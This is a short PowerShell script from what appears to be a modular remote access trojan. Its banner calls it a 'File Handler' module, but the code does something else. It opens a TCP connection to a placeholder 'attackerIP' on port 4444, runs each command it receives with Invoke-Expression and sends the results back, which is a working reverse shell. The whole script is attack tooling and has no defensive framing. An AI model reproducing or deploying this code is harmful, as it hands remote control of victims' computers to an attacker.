function title {
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
    | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
    |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
    " -ForegroundColor Yellow
    Write-Host "
                        Module : File Handler
    " -ForegroundColor Blue
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host ""
 }

function run() {
    title
    try {
        $host = "10.0.0.212"
        $client = New-Object System.Net.Sockets.TCPClient('attackerIP', 4444)
        $stream = $client.GetStream() 
        [byte[]]$bytes = 0..65535 | % { 0 }; 
        
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            ; 
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
            $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush() 
        };
    }
    catch {
       Write-Host "Could not establish connection..." -ForegroundColor Red
       exit 
    }
 }
 
 run
